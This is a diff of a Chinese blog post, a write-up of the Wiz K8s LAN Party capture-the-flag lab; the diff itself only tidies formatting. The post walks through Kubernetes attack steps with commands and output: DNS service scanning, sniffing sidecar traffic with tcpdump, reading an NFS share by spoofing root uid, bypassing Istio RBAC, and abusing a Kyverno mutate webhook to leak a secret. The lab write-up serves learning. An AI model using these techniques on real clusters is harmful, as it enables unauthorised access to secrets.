@@ -29,7 +29,6 @@ tags:
     search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal
     nameserver 10.100.120.34
     options ndots:5
-    
 
 ### 服务发现
 
@@ -37,13 +36,11 @@ tags:
     34899 / 65536 [->] 53.25% 987 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.
     65356 / 65536 [->] 99.73% 989 p/s10.100.136.254 -> getflag-service.k8s-lan-party.svc.cluster.local.
     player@wiz-k8s-lan-party:~$ 
-    
 
 ### 访问服务
 
     player@wiz-k8s-lan-party:~$ curl getflag-service.k8s-lan-party.svc.cluster.local
     wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
-    
 
 获取 flag: `wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}`
 
@@ -62,13 +59,11 @@ tags:
     Active Internet connections (w/o servers)
     Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      Timer
     tcp        0      0 192.168.11.95:55720     10.100.171.123:80       TIME_WAIT   0          0          timewait (43.81/0/0)
-    
 
 发现 `10.100.171.123:80` 连接，`ss` 看不到信息，判断是 `sidecars` 发起的
 
     player@wiz-k8s-lan-party:~$ ss -tnp
     State            Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port            Process
-    
 
 ### 使用 tcpdump 捕获流量
 
@@ -76,7 +71,6 @@ tags:
     tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
     listening on ns-d6d5f3, link-type EN10MB (Ethernet), snapshot length 262144 bytes
     wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}
-    
 
 - `-s 0` captures the entire packet data (headers and payload).
 - `-A` prints the packet data in ASCII format.
@@ -96,7 +90,6 @@ tags:
 
     player@wiz-k8s-lan-party:~$ mount|grep -i "nfs"
     fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.57.108,local_lock=none,addr=192.168.124.98)
-    
 
 获取到信息
 
@@ -110,7 +103,6 @@ tags:
     flag.txt
     player@wiz-k8s-lan-party:~$ cat /efs/flag.txt
     cat: /efs/flag.txt: Permission denied
-    
 
 ### 使用 `nfs-ls`
 
@@ -123,13 +115,11 @@ tags:
     gid=<int>         : GID value to use when talking to the server.
                          default it 65534 on Windows and getgid() on unixen.
     version=<3|4>     : NFS Version. Default is 3.
-    
 
 添加参数构造链接查看
 
     player@wiz-k8s-lan-party:~$ nfs-ls "nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4&uid=0&gid=0"
     ----------  1     1     1           73 flag.txt
-    
 
 ### 使用 `nfs-cat`
 
@@ -138,7 +128,6 @@ tags:
     Failed to open nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/flag.txt?version=4&uid=0&gid=0
     player@wiz-k8s-lan-party:~$ nfs-cat "nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&uid=0&gid=0"
     wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
-    
 
 第一次 `nfs-cat` 错误提示绝对路径 `flag.txt` 前面需要 `/` 添加后执行成功，获取 flag: `wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}`
 
@@ -153,7 +142,6 @@ tags:
 
     root@wiz-k8s-lan-party:~# dnscan -subnet 10.100.*.*
     10.100.224.159 -> istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
-    
 
 直接请求返回 `RBAC: access denied`
 
@@ -176,7 +164,6 @@ tags:
         to:
         - operation:
             methods: ["POST", "GET"]
-    
 
 ### 查看提示
 
@@ -228,7 +215,6 @@ tags:
     [3] https://stackoverflow.com/questions/67223438/why-iptables-rule-setup-in-initcontainer-istio-init-works-in-application-conta
     [4] https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot
     [5] https://istio.io/latest/docs/ops/best-practices/security/
-    
 
 ### 限制绕过
 
@@ -243,7 +229,6 @@ tags:
     $ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
     wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}
     $
-    
 
 获得 flag: `wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}`
 
@@ -274,7 +259,6 @@ tags:
                     env:
                       - name: FLAG
                         value: "{flag}"
-    
 
 本策略重点：
 
@@ -298,7 +282,6 @@ tags:
     10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
     10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
     10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
-    
 
 得到 kyverno 的服务地址 `kyverno-svc.kyverno.svc.cluster.local`
 
@@ -311,8 +294,7 @@ The relevant HTTP path for mutate requests is typically `/mutate`.
 2. **Validate Requests**: The relevant HTTP path for validate requests is typically `/validate-policy`.
 3. **Other Paths**: Kyverno may also use other HTTP paths for specific purposes, such as `/apis/networking.k8s.io/v1/ingresses` for querying Ingress resources, as shown in the example policy in the provided sources. 结合 gpt 给出的例子，请求应该是这样的
 
-    curl --http1.1 -X POST -H "Content-Type: application/json" --data-binary @admissionreview.json https://your-admission-webhook-url/mutate
-    
+    curl --http1.1 -X POST -H "Content-Type: application/json" --data-binary @admissionreview.json <https://your-admission-webhook-url/mutate>
 
 ### 创建配置
 
@@ -329,12 +311,10 @@ The relevant HTTP path for mutate requests is typically `/mutate`.
       containers:
         - name: nginx
           image: nginx
-    
 
 使用 kube-review 转换为 AdmissionReview 请求数据
 
     ./kube-review create mutate.yaml
-    
 
 ![](assets/img/blog/imported/writeup-k8s-lan-party-by-wiz.io-Pasted-image-20240607154336.png)
 保存转换后的数据到线上靶场 `post.json`
@@ -343,10 +323,10 @@ The relevant HTTP path for mutate requests is typically `/mutate`.
 
     player@wiz-k8s-lan-party:~$ curl --http1.1 -X POST -H "Content-Type: application/json" --data-binary @post.json https://kyverno-svc.kyverno.svc.cluster.local/mutate -k | jk
     {"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"efdec7a8-81ba-46dd-bcda-c77ba875cac5","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"apply-flag-to-env","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"bd1261ef-efab-4f4b-aba3-805929653144"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"apply-flag-to-env","namespace":"sensitive-ns","creationTimestamp":null},"spec":{"containers":[{"name":"nginx","image":"nginx","resources":{}}]},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"efdec7a8-81ba-46dd-bcda-c77ba875cac5","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}
-    
 
-获取 response 
+获取 response
 ![](assets/img/blog/imported/writeup-k8s-lan-party-by-wiz.io-Pasted-image-20240607154530.png)
+
 ### 解码
 
 解码响应中的数据
@@ -371,13 +351,12 @@ The relevant HTTP path for mutate requests is typically `/mutate`.
         }
       }
     ]
-    
 
 得到 flag: `wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}`
 
 ---
 
-## Resources:
+## Resources
 
 | Link | Info |
 |---|---|
@@ -385,6 +364,4 @@ The relevant HTTP path for mutate requests is typically `/mutate`.
 |[https://wiki.teamssix.com/cloudnative/kubernetes/wiz-k8s-lan-party-wp.html](https://wiki.teamssix.com/cloudnative/kubernetes/wiz-k8s-lan-party-wp.html)|WIZ K8S LAN Party Writeup|
 |[https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html)|Kubernetes Internal Service Discovery|
 
-Created Date: June 6th 2024 (09:35 pm) 
-
-Last Modified Date: June 6th 2024 (09:35 pm)
+Created Date: June 6th 2024 (09:35 pm)
